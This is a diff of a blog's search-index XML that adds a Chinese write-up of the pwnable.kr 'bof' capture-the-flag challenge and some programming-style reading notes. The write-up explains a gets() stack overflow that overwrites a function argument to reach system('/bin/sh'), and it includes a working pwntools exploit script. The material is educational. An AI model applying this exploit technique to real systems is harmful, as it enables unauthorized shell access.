@@ -3,9 +3,16 @@
   
     
     <entry>
+      <title><![CDATA[Pwnable.kr:bof]]></title>
+      <url>%2F2017%2F04%2F07%2FPwnable-kr-bof%2F</url>
+      <content type="text"><![CDATA[简单栈溢出。 bof原题有提供binary和source code。 12(venv) chybeta@ubuntu:~/pwn/pwnable/bof$ file bofbof: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=ed643dfe8d026b7238d3033b0d0bcc499504f273, not stripped 用IDA打开，f5: main函数： func函数： func函数接受一个参数（0xDEADBEEF），之后通过gets（）接受输入。因此可以通过栈溢出，将a1覆盖为0xCAFEBABE，这样能直接执行 system(“/bin/sh”) a1 是 func（）的参数，在栈上位于 ebp+8h 的位置。而输入字符串的起点为 ebp-2ch。两者相差：0x2c + 0x8h = 52 。 exp123456from pwn import *p = remote("pwnable.kr","9000")payload = 'a' * 52payload += p32(0xcafebabe)p.sendline(payload)p.interactive() flag]]></content>
+    </entry>
+
+    
+    <entry>
       <title><![CDATA[《The Pracetice of Programming》读书笔记（1）]]></title>
       <url>%2F2017%2F04%2F06%2F%E3%80%8AThe-Pracetice-of-Programming%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%EF%BC%881%EF%BC%89%2F</url>
-      <content type="text"></content>
+      <content type="text"><![CDATA[《The Pracetice of Programming》读书笔记 Style Usually,the real code is mostly well down,but with something that could be improved. There is more to writing a program than getting the syntax right, fixing the bugs, and making it run fast enough. The principles of programming style are based on common sense guided by experience. Names labels an object and conveys information about its purpose. informative、concise、memorable, and pronounceable if possible the border the scope,the more information conveyed. suggestion 1use descriptive name for globals,short names for locals.]]></content>
     </entry>
 
     
